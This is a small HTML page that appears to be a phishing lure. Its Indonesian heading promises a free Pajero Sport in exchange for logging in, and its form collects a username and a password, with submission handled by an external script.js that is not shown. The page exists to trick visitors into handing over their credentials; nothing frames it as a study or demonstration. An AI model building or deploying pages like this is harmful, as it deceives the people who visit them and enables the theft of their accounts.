<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Message Submission</title>
</head>
<body>

    <h1>Login untuk mendapat pajero sport gratis</h1>

    <form id="messageForm">
        <input
            type="text"
            id="username"
            placeholder="Username"
            required
        ><br><br>

        <input type="password"
            id="message"
            placeholder="Password"
            required
        ></input><br><br>

        <button type="submit" id="submitButton">Submit</button>
    </form>

    <p id="status"></p>

    <script src="script.js"></script>
</body>
</html>
